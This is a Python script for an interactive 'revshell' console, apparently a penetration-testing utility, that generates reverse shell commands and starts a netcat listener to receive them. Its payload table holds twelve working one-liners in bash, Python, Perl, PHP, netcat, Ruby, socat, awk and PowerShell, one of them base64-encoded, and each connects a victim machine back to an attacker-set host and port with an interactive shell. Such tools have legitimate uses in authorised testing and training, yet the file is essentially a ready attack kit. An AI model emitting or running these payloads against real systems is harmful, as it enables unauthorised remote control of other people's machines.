#!/usr/bin/env python3

import sys
import shlex
import readline
import subprocess
import shutil
import socket
import struct
import json
from dataclasses import dataclass


class C:
    RED    = "\033[91m"
    GREEN  = "\033[92m"
    YELLOW = "\033[93m"
    BLUE   = "\033[94m"
    CYAN   = "\033[96m"
    WHITE  = "\033[97m"
    BOLD   = "\033[1m"
    DIM    = "\033[2m"
    END    = "\033[0m"

    @staticmethod
    def r(s): return f"{C.RED}{s}{C.END}"
    @staticmethod
    def g(s): return f"{C.GREEN}{s}{C.END}"
    @staticmethod
    def y(s): return f"{C.YELLOW}{s}{C.END}"
    @staticmethod
    def b(s): return f"{C.BLUE}{s}{C.END}"
    @staticmethod
    def c(s): return f"{C.CYAN}{s}{C.END}"
    @staticmethod
    def bold(s): return f"{C.BOLD}{s}{C.END}"
    @staticmethod
    def dim(s): return f"{C.DIM}{s}{C.END}"


@dataclass
class Payload:
    key:      str
    name:     str
    platform: str
    template: str

    def render(self, lhost: str, lport: str) -> str:
        return self.template.format(lhost=lhost, lport=lport)


PAYLOADS: list[Payload] = [
    Payload("bash", "Bash", "unix",
        "bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"),

    Payload("bash_196", "Bash 196", "unix",
        "0<&196;exec 196<>/dev/tcp/{lhost}/{lport};sh <&196 >&196 2>&196"),

    Payload("python", "Python", "unix",
        "python3 -c 'import socket,os,pty;"
        "s=socket.socket();s.connect((\"{lhost}\",{lport}));"
        "os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
        "pty.spawn(\"/bin/bash\")'"),

    Payload("perl", "Perl", "unix",
        "perl -e 'use Socket;$i=\"{lhost}\";$p={lport};"
        "socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));"
        "if(connect(S,sockaddr_in($p,inet_aton($i)))){{" 
        "open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");"
        "exec(\"/bin/sh -i\");}};'"),

    Payload("php", "PHP", "unix",
        "php -r '$sock=fsockopen(\"{lhost}\",{lport});"
        "exec(\"/bin/sh -i <&3 >&3 2>&3\");'"),

    Payload("nc", "Netcat", "unix",
        "nc -e /bin/sh {lhost} {lport}"),

    Payload("nc_mkfifo", "Netcat mkfifo", "unix",
        "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f"),

    Payload("ruby", "Ruby", "unix",
        "ruby -rsocket -e'f=TCPSocket.open(\"{lhost}\",{lport}).to_i;"
        "exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"),

    Payload("socat", "Socat", "unix",
        "socat tcp-connect:{lhost}:{lport} exec:'bash -li',pty,stderr,setsid,sigint,sane"),

    Payload("awk", "AWK", "unix",
        "awk 'BEGIN {{s = \"/inet/tcp/0/{lhost}/{lport}\"; while(42) {{ do {{"
        "printf \"shell>\" |& s; s |& getline c; if (c) {{"
        "while ((c |& getline) > 0) print $0 |& s; close(c); }} }}"
        "while(c != \"exit\") }}}}'"),

    Payload("powershell", "PowerShell", "windows",
        "powershell -NoP -NonI -W Hidden -Exec Bypass -Command "
        "$c=New-Object System.Net.Sockets.TCPClient(\"{lhost}\",{lport});"
        "$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};"
        "while(($i=$s.Read($b,0,$b.Length)) -ne 0){{"
        "$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);"
        "$sb=(iex $d 2>&1|Out-String);$sb2=$sb+\"PS \"+(pwd).Path+\"> \";"
        "$by=([text.encoding]::ASCII).GetBytes($sb2);"
        "$s.Write($by,0,$by.Length);$s.Flush()}};"
        "$c.Close()"),

    Payload("ps_b64", "PS Base64", "windows",
        "powershell -e "
        "JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAeyBsAGgAbwBzAHQAfQAiACwAIAB7AGwAcABvAHIAdAB9ACkA"),
]

PAYLOAD_MAP    = {p.key: p for p in PAYLOADS}
PLATFORM_ICON  = {"unix": "🐧", "windows": "🪟", "both": "🌐"}
NC_CANDIDATES  = ["nc", "ncat", "netcat"]


# ─────────────────────────────────────────────
#  Network interface helpers
# ─────────────────────────────────────────────

def get_interfaces() -> dict[str, str]:
    """
    Return {interface_name: ipv4_address} for all UP interfaces that have an
    IPv4 address.  Works without netifaces by parsing /proc/net/if_inet6 and
    /proc/net/fib_trie (Linux) or falling back to `ip addr` / `ifconfig`.
    """
    ifaces: dict[str, str] = {}

    # --- Method 1: socket.if_nameindex + getaddrinfo (portable, fast) -------
    try:
        import fcntl
        SIOCGIFADDR = 0x8915
        for idx, name in socket.if_nameindex():
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                packed = fcntl.ioctl(s.fileno(), SIOCGIFADDR,
                                     struct.pack("256s", name[:15].encode()))
                ip = socket.inet_ntoa(packed[20:24])
                s.close()
                if not ip.startswith("127."):
                    ifaces[name] = ip
            except Exception:
                pass
        if ifaces:
            return ifaces
    except Exception:
        pass

    # --- Method 2: `ip -4 addr show` ----------------------------------------
    try:
        out = subprocess.check_output(
            ["ip", "-4", "addr", "show"],
            stderr=subprocess.DEVNULL, text=True
        )
        current_iface = None
        for line in out.splitlines():
            line = line.strip()
            if line and line[0].isdigit():
                current_iface = line.split(":")[1].strip().split("@")[0]
            elif line.startswith("inet ") and current_iface:
                ip = line.split()[1].split("/")[0]
                if not ip.startswith("127."):
                    ifaces[current_iface] = ip
        if ifaces:
            return ifaces
    except Exception:
        pass

    # --- Method 3: `ifconfig` ------------------------------------------------
    try:
        out = subprocess.check_output(
            ["ifconfig"], stderr=subprocess.DEVNULL, text=True
        )
        current_iface = None
        for line in out.splitlines():
            if line and not line[0].isspace():
                current_iface = line.split(":")[0].split()[0]
            if "inet " in line and current_iface:
                parts = line.strip().split()
                for i, p in enumerate(parts):
                    if p in ("inet", "addr:"):
                        ip = parts[i + 1].replace("addr:", "")
                        if not ip.startswith("127."):
                            ifaces[current_iface] = ip
                        break
        if ifaces:
            return ifaces
    except Exception:
        pass

    return ifaces


def resolve_iface_ip(name: str) -> str | None:
    """Return IPv4 for an interface name, or None if not found."""
    ifaces = get_interfaces()
    return ifaces.get(name)


def is_interface_name(value: str) -> bool:
    """Heuristic: does this look like an interface name rather than an IP?"""
    # An IP address is all digits and dots
    import re
    return not bool(re.match(r"^\d{1,3}(\.\d{1,3}){3}$", value))


def print_interfaces(highlight: str | None = None) -> None:
    """Pretty-print all interfaces with their IPv4 addresses."""
    ifaces = get_interfaces()
    W = 52
    print(f"\n{C.BOLD}{C.YELLOW}{'─' * W}{C.END}")
    print(f"{C.BOLD}{C.YELLOW}  {'INTERFACE':<18}{'IPv4':}{C.END}")
    print(f"{C.dim('─' * W)}")
    if not ifaces:
        print(f"  {C.r('No interfaces found.')}")
    for name, ip in ifaces.items():
        is_hl = highlight and name == highlight
        name_col = C.bold(C.g(name)) if is_hl else C.g(name)
        ip_col   = C.bold(C.c(ip))   if is_hl else ip
        arrow    = f"  {C.y('◀ selected')}" if is_hl else ""
        print(f"  {name_col:<{18 + len(C.GREEN) + len(C.END) + (len(C.BOLD) if is_hl else 0)}}{ip_col}{arrow}")
    print(f"{C.BOLD}{C.YELLOW}{'─' * W}{C.END}\n")


def interactive_iface_picker(session: "Session") -> None:
    """
    Display numbered list of interfaces, let user pick one by number or name.
    Returns after setting session.lhost.
    """
    ifaces = get_interfaces()
    if not ifaces:
        print(C.r("  [-] No interfaces found."))
        return

    entries = list(ifaces.items())  # [(name, ip), ...]
    W = 52

    print(f"\n{C.BOLD}{C.YELLOW}{'─' * W}{C.END}")
    print(f"{C.BOLD}{C.YELLOW}  {'#':<5}{'INTERFACE':<18}IPv4{C.END}")
    print(f"{C.dim('─' * W)}")
    for i, (name, ip) in enumerate(entries, 1):
        print(f"  {C.dim(str(i) + '.'):<{5 + len(C.DIM) + len(C.END)}}{C.g(name):<{18 + len(C.GREEN) + len(C.END)}}{ip}")
    print(f"{C.BOLD}{C.YELLOW}{'─' * W}{C.END}")
    print(f"  {C.dim('Enter number or interface name (empty to cancel):')}")

    try:
        choice = input(f"  {C.BOLD}{C.GREEN}>{C.END} ").strip()
    except (KeyboardInterrupt, EOFError):
        print()
        return

    if not choice:
        print(C.dim("  Cancelled."))
        return

    selected_name: str | None = None
    selected_ip:   str | None = None

    if choice.isdigit():
        idx = int(choice) - 1
        if 0 <= idx < len(entries):
            selected_name, selected_ip = entries[idx]
        else:
            print(C.r(f"  [-] Invalid number: {choice}"))
            return
    elif choice in ifaces:
        selected_name = choice
        selected_ip   = ifaces[choice]
    else:
        print(C.r(f"  [-] Unknown interface: '{choice}'"))
        return

    session.lhost = selected_ip
    change_config(host=selected_ip)
    print(f"\n  {C.dim('LHOST')} => {C.bold(C.g(selected_ip))}  {C.dim('(' + selected_name + ')')}\n")


# ─────────────────────────────────────────────
#  Session
# ─────────────────────────────────────────────

class Session:
    def __init__(self):
        self.lhost: str | None = None
        self.lport: str | None = None

    def set(self, key: str, value: str) -> tuple[bool, str | None]:
        """
        Returns (success, resolved_ip_or_none).
        resolved_ip is set when value was an interface name that got resolved.
        """
        k = key.lower()
        if k in ("ip", "lhost", "host"):
            if is_interface_name(value):
                ip = resolve_iface_ip(value)
                if ip is None:
                    return False, None   # signal: unknown interface
                self.lhost = ip
                return True, ip          # resolved from interface
            else:
                self.lhost = value
                return True, None
        if k in ("port", "lport"):
            self.lport = value
            return True, None
        return False, None

    def render_lhost(self) -> str:
        return self.lhost if self.lhost else C.r("<LHOST>")

    def render_lport(self) -> str:
        return self.lport if self.lport else C.r("<LPORT>")


# ─────────────────────────────────────────────
#  Listener / config
# ─────────────────────────────────────────────

def find_nc() -> tuple[str, str] | None:
    for binary in NC_CANDIDATES:
        path = shutil.which(binary)
        if path:
            return binary, path
    return None


def start_listener(port: str, use_rlwrap: bool = False) -> None:
    result = find_nc()
    if result is None:
        print(C.r("  [-] Netcat not found (nc / ncat / netcat)."))
        print(f"  {C.dim('Install it with:')}  sudo apt install netcat-openbsd")
        return

    binary, path = result
    cmd = [binary, "-lvnp", port]

    if use_rlwrap:
        if not shutil.which("rlwrap"):
            print(C.y("  [!] rlwrap not found — falling back to plain netcat."))
            print(f"  {C.dim('Install it with:')}  sudo apt install rlwrap")
        else:
            cmd = ["rlwrap"] + cmd

    label = "rlwrap " + binary if use_rlwrap and shutil.which("rlwrap") else binary
    print(f"\n  {C.bold('Starting listener:')}  {C.g(' '.join(cmd))}")
    print(f"  {C.dim(f'Binary: {path}')}")
    print(f"\n{C.BOLD}{C.YELLOW}{'─' * 60}{C.END}")
    print(f"  {C.dim('Waiting for connection on port')} {C.g(port)} {C.dim('... (Ctrl+C to stop)')}")
    print(f"{C.BOLD}{C.YELLOW}{'─' * 60}{C.END}\n")

    try:
        subprocess.run(cmd)
    except KeyboardInterrupt:
        print(f"\n\n  {C.dim('Listener stopped.')}\n")
    except FileNotFoundError:
        print(C.r(f"  [-] Could not execute '{cmd[0]}'."))


def load_config() -> dict:
    try:
        with open("conf.json", "r") as f:
            return json.load(f)
    except (FileNotFoundError, json.JSONDecodeError):
        return {"param": {"host": "", "port": ""}}

def change_config(host: str | None = None, port: str | None = None) -> None:
    config = load_config()
    if "param" not in config:
        config["param"] = {}

    if host is not None:
        config["param"]["host"] = host
    if port is not None:
        config["param"]["port"] = port

    try:
        with open("conf.json", "w") as f:
            json.dump(config, f, indent=4)
    except IOError as e:
        print(C.r(f"  [-] Failed to write config: {e}"))


# ─────────────────────────────────────────────
#  UI strings
# ─────────────────────────────────────────────

BANNER = f"""
{C.BOLD}{C.RED}
  ██████╗ ███████╗██╗   ██╗███████╗██╗  ██╗███████╗██╗     ██╗
  ██╔══██╗██╔════╝██║   ██║██╔════╝██║  ██║██╔════╝██║     ██║
  ██████╔╝█████╗  ██║   ██║███████╗███████║█████╗  ██║     ██║
  ██╔══██╗██╔══╝  ╚██╗ ██╔╝╚════██║██╔══██║██╔══╝  ██║     ██║
  ██║  ██║███████╗ ╚████╔╝ ███████║██║  ██║███████╗███████╗███████╗
  ╚═╝  ╚═╝╚══════╝  ╚═══╝  ╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝
{C.END}{C.DIM}\n\n  Reverse Shell Generator Console  •  Source: Invicti{C.END}
{C.END}{C.DIM}  Author: {C.BOLD}{C.RED}@ZetaOrioniss{C.END}
{C.END}{C.DIM}  Version: {C.BOLD}{C.RED}v1.1{C.END}
{C.DIM}\n\n  Type {C.END}{C.BOLD}help{C.END}{C.DIM} to list available commands.{C.END}
"""

HELP = f"""
{C.BOLD}{C.YELLOW}
╔══════════════════════════════════════════════════════════════╗
║                           COMMANDS                           ║
╚══════════════════════════════════════════════════════════════╝{C.END}

  {C.bold('Configuration')}
  {C.g('load config')}              Load configuration from conf.json
  {C.g('set ip <address|iface>')}   Set LHOST — accepts IP or interface name
  {C.g('set port <port>')}          Set LPORT  (alias: lport)
  {C.g('unset ip|port')}            Clear a value
  {C.g('show options')}             Display current configuration

  {C.bold('Network Interfaces')}
  {C.g('ifconfig')}  /  {C.g('interfaces')}     List all IPv4 interfaces
  {C.g('ifconfig pick')}            Interactive interface picker → sets LHOST

  {C.bold('Payloads')}
  {C.g('show')}                     List all available payloads
  {C.g('use <name>')}               Display a specific payload
  {C.g('run')}  /  {C.g('generate')}           Display all payloads with current config
  {C.g('run <name>')}               Display a specific payload
  {C.g('run --unix')}               Filter Unix payloads only
  {C.g('run --windows')}            Filter Windows payloads only

  {C.bold('Listener')}
  {C.g('listener')}                 Start nc -lvnp <LPORT>
  {C.g('rlwrap')}                   Start listener with rlwrap (better TTY)

  {C.bold('Other')}
  {C.g('clear')}                    Clear the screen
  {C.g('help')}                     Show this help
  {C.g('exit')}  /  {C.g('quit')}             Exit the console
"""


# ─────────────────────────────────────────────
#  Display helpers
# ─────────────────────────────────────────────

def print_all_payloads(session: Session, platform_filter: str | None = None) -> None:
    lhost    = session.render_lhost()
    lport    = session.render_lport()
    filtered = [p for p in PAYLOADS
                if platform_filter is None or p.platform in (platform_filter, "both")]
    W     = 104
    title = f" PAYLOADS — {session.lhost or 'LHOST'}:{session.lport or 'LPORT'} "

    print(f"\n{C.BOLD}{C.YELLOW}{'═' * W}{C.END}")
    print(f"{C.BOLD}{C.YELLOW}{title.center(W)}{C.END}")
    print(f"{C.BOLD}{C.YELLOW}{'═' * W}{C.END}")
    print(f"  {C.bold('NAME'):<{14 + len(C.BOLD) + len(C.END)}}{'OS':<14}COMMAND")
    print(f"{C.dim('─' * W)}")

    for p in filtered:
        icon   = PLATFORM_ICON.get(p.platform, "")
        cmd    = p.render(lhost, lport)
        os_col = C.dim(f"{icon} {p.platform}")
        print(f"  {C.g(p.name):<{14 + len(C.GREEN) + len(C.END)}}{os_col:<{14 + len(C.DIM) + len(C.END)}}{cmd}")
        print(f"{C.dim('·' * W)}")

    print(f"{C.BOLD}{C.YELLOW}{'═' * W}{C.END}\n")


def print_single_payload(p: Payload, session: Session) -> None:
    cmd  = p.render(session.render_lhost(), session.render_lport())
    icon = PLATFORM_ICON.get(p.platform, "")
    W    = 104

    print(f"\n{C.BOLD}{C.YELLOW}{'─' * W}{C.END}")
    print(f"  {C.bold(f'{icon} {p.name}')}  {C.dim('(' + p.platform + ')')}")
    print(f"{C.BOLD}{C.YELLOW}{'─' * W}{C.END}\n")
    print(f"  {cmd}\n")
    if session.lport:
        print(f"  {C.dim('Listener:')}  nc -lvnp {session.lport}")
    print(f"\n{C.BOLD}{C.YELLOW}{'─' * W}{C.END}\n")


def print_payload_list() -> None:
    print(f"\n  {C.bold('KEY'):<{16 + len(C.BOLD) + len(C.END)}}{'NAME':<16}OS")
    print(f"  {C.dim('─' * 44)}")
    for p in PAYLOADS:
        icon = PLATFORM_ICON.get(p.platform, "")
        print(f"  {C.g(p.key):<{16 + len(C.GREEN) + len(C.END)}}{p.name:<16}{icon} {p.platform}")
    print()


# ─────────────────────────────────────────────
#  Tab completion
# ─────────────────────────────────────────────

COMMANDS   = ["load", "set", "unset", "use", "run", "generate", "show",
              "ifconfig", "interfaces", "listener", "rlwrap", "clear",
              "help", "exit", "quit"]
SET_KEYS   = ["config", "ip", "port", "lhost", "lport", "host"]
SHOW_OPTS  = ["payloads", "options"]
SHELL_KEYS = [p.key for p in PAYLOADS]


def _iface_names() -> list[str]:
    try:
        return list(get_interfaces().keys())
    except Exception:
        return []


def completer(text: str, state: int):
    line   = readline.get_line_buffer().lstrip()
    parts  = line.split()
    nparts = len(parts)

    if nparts == 0 or (nparts == 1 and not line.endswith(" ")):
        opts = [c for c in COMMANDS if c.startswith(text)]
    elif parts[0] == "set" and nparts <= 2:
        opts = [k for k in SET_KEYS if k.startswith(text)]
    elif parts[0] == "set" and nparts == 3 and parts[1].lower() in ("ip", "host", "lhost"):
        # Offer interface names as completions for the value
        opts = [n for n in _iface_names() if n.startswith(text)]
    elif parts[0] in ("use", "run") and nparts <= 2:
        opts = [k for k in SHELL_KEYS if k.startswith(text)]
    elif parts[0] == "show" and nparts <= 2:
        opts = [o for o in SHOW_OPTS if o.startswith(text)]
    elif parts[0] == "unset" and nparts <= 2:
        opts = [k for k in ("ip", "port") if k.startswith(text)]
    elif parts[0] in ("ifconfig", "interfaces") and nparts <= 2:
        opts = [o for o in ("pick",) + tuple(_iface_names()) if o.startswith(text)]
    else:
        opts = []

    return opts[state] if state < len(opts) else None


readline.set_completer(completer)
readline.parse_and_bind("tab: complete")


# ─────────────────────────────────────────────
#  Prompt
# ─────────────────────────────────────────────

def prompt(session: Session) -> str:
    h = session.lhost or "-"
    p = session.lport or "-"
    return f"{C.BOLD}{C.RED}revshell{C.END} {C.dim(f'({h}:{p})')} {C.BOLD}{C.GREEN}>{C.END} "


# ─────────────────────────────────────────────
#  Main loop
# ─────────────────────────────────────────────

def run_console() -> None:
    print(BANNER)
    session = Session()

    while True:
        try:
            raw = input(prompt(session)).strip()
        except (KeyboardInterrupt, EOFError):
            print(f"\n{C.dim('Goodbye.')}\n")
            break

        if not raw:
            continue

        try:
            parts = shlex.split(raw)
        except ValueError as e:
            print(C.r(f"[-] Parse error: {e}"))
            continue

        cmd  = parts[0].lower()
        args = parts[1:]

        # ── exit ──────────────────────────────────────────────────────────
        if cmd in ("exit", "quit"):
            print(f"\n{C.dim('Goodbye.')}\n")
            break

        # ── help ──────────────────────────────────────────────────────────
        elif cmd == "help":
            print(HELP)

        # ── clear ─────────────────────────────────────────────────────────
        elif cmd == "clear":
            print("\033[2J\033[H", end="")
            print(BANNER)

        # ── load config ───────────────────────────────────────────────────
        elif cmd == "load":
            if len(args) != 1 or args[0].lower() != "config":
                print(C.r("  Usage: load config"))
            else:
                config = load_config()
                param  = config.get("param", {})
                host   = param.get("host", "")
                port   = param.get("port", "")

                if host:
                    session.lhost = host
                    print(f"  {C.dim('LHOST loaded from config:')} {C.g(host)}")
                else:
                    print(C.dim("  LHOST not set in config. Run 'set ip <address>' to set it."))

                if port:
                    session.lport = port
                    print(f"  {C.dim('LPORT loaded from config:')} {C.g(port)}")
                else:
                    print(C.dim("  LPORT not set in config. Run 'set port <port>' to set it."))

        # ── set ───────────────────────────────────────────────────────────
        elif cmd == "set":
            if len(args) < 2:
                print(C.r("  Usage: set <ip|port> <value|interface>"))
            else:
                key_arg = args[0]
                val_arg = args[1]
                ok, resolved = session.set(key_arg, val_arg)

                if ok:
                    label = "LHOST" if key_arg.lower() in ("ip", "host", "lhost") else "LPORT"
                    if resolved is not None:
                        # value was an interface name
                        print(f"  {C.dim(label)} => {C.bold(C.g(resolved))}  {C.dim('(resolved from interface ' + val_arg + ')')}")
                        change_config(host=resolved)
                    else:
                        print(f"  {C.dim(label)} => {C.g(val_arg)}")
                        if label == "LHOST":
                            change_config(host=val_arg)
                        else:
                            change_config(port=val_arg)
                else:
                    # Check if it looked like an interface but wasn't found
                    if key_arg.lower() in ("ip", "host", "lhost") and is_interface_name(val_arg):
                        print(C.r(f"  [-] Interface '{val_arg}' not found or has no IPv4 address."))
                        print(f"  {C.dim('Use')} ifconfig {C.dim('to list available interfaces.')}")
                    else:
                        print(C.r(f"  [-] Unknown key: '{key_arg}'  (ip, port)"))

        # ── unset ─────────────────────────────────────────────────────────
        elif cmd == "unset":
            if not args:
                print(C.r("  Usage: unset <ip|port>"))
            else:
                k = args[0].lower()
                if k in ("ip", "host", "lhost"):
                    session.lhost = None
                    change_config(host="")
                    print(C.dim("  LHOST cleared."))
                elif k in ("port", "lport"):
                    session.lport = None
                    change_config(port="")
                    print(C.dim("  LPORT cleared."))
                else:
                    print(C.r(f"  [-] Unknown key: '{args[0]}'"))

        # ── show ──────────────────────────────────────────────────────────
        elif cmd == "show":
            sub = args[0].lower() if args else ""
            if sub == "options":
                h = C.g(session.lhost) if session.lhost else C.r("not set")
                p = C.g(session.lport) if session.lport else C.r("not set")
                print(f"\n  {C.bold('LHOST')}  =>  {h}")
                print(f"  {C.bold('LPORT')}  =>  {p}\n")
            elif sub in ("payloads", "shells", ""):
                print_payload_list()
            else:
                print(C.r(f"  [-] Unknown option: '{sub}'  (options, payloads)"))

        # ── ifconfig / interfaces ─────────────────────────────────────────
        elif cmd in ("ifconfig", "interfaces"):
            sub = args[0].lower() if args else ""
            if sub == "pick":
                interactive_iface_picker(session)
            elif sub and sub in get_interfaces():
                # `ifconfig eth0` → show just that one highlighted
                print_interfaces(highlight=sub)
            else:
                print_interfaces()
                print(f"  {C.dim('Tip:')} {C.g('ifconfig pick')} {C.dim('to interactively set LHOST')}")
                print(f"  {C.dim('Tip:')} {C.g('set ip <iface>')} {C.dim('to set LHOST from an interface name')}\n")

        # ── use ───────────────────────────────────────────────────────────
        elif cmd == "use":
            if not args:
                print(C.r("  Usage: use <name>  —  see 'show payloads'"))
            else:
                key = args[0].lower()
                if key in PAYLOAD_MAP:
                    print_single_payload(PAYLOAD_MAP[key], session)
                else:
                    print(C.r(f"  [-] Unknown payload: '{args[0]}'"))
                    print(f"  {C.dim('Type')} show {C.dim('to see the list.')}")

        # ── run / generate ────────────────────────────────────────────────
        elif cmd in ("run", "generate"):
            platform_filter = None
            remaining       = []
            for a in args:
                if a in ("--unix", "-u"):
                    platform_filter = "unix"
                elif a in ("--windows", "-w"):
                    platform_filter = "windows"
                else:
                    remaining.append(a)

            if remaining:
                key = remaining[0].lower()
                if key in PAYLOAD_MAP:
                    print_single_payload(PAYLOAD_MAP[key], session)
                else:
                    print(C.r(f"  [-] Unknown payload: '{remaining[0]}'"))
            else:
                print_all_payloads(session, platform_filter)

        # ── listener ──────────────────────────────────────────────────────
        elif cmd == "listener":
            if not session.lport:
                print(C.r("  [-] LPORT not set — type: set port <port>"))
            else:
                start_listener(session.lport, use_rlwrap=False)

        # ── rlwrap ────────────────────────────────────────────────────────
        elif cmd == "rlwrap":
            if not session.lport:
                print(C.r("  [-] LPORT not set — type: set port <port>"))
            else:
                start_listener(session.lport, use_rlwrap=True)

        # ── unknown ───────────────────────────────────────────────────────
        else:
            print(C.r(f"  [-] Unknown command: '{cmd}'"))
            print(f"  {C.dim('Type')} help {C.dim('for available commands.')}")


if __name__ == "__main__":
    run_console()
